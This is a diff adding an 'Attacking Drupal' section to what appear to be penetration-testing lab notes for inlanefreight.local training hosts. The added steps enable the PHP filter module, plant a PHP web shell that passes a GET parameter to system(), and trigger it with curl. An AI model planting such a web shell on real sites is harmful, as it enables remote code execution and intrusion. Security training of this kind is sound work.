@@ -207,3 +207,17 @@ curl -s http://drupal-acc.inlanefreight.local/CHANGELOG.txt | grep -m2 ""
 ```bash
 droopescan scan drupal -u http://drupal.inlanefreight.local
 ```
+### Attacking Drupal
+* In older versions of Drupal (before version 8), it was possible to log in as an admin and enable the `PHP filter` module, which "Allows embedded PHP code/snippets to be evaluated."
+	* From here, we could tick the check box next to the module and scroll down to `Save configuration`
+	* Next, we could go to Content --> Add content and create a `Basic page`
+	* We can now create a page with a malicious PHP snippet:
+```php
+<?php
+system($_GET['dcfdd5e021a869fcc6dfaef8bf31377e']);
+?>
+```
+```bash
+curl -s http://drupal-qa.inlanefreight.local/node/3?dcfdd5e021a869fcc6dfaef8bf31377e=id | grep uid | cut -f4 -d">"
+```
+
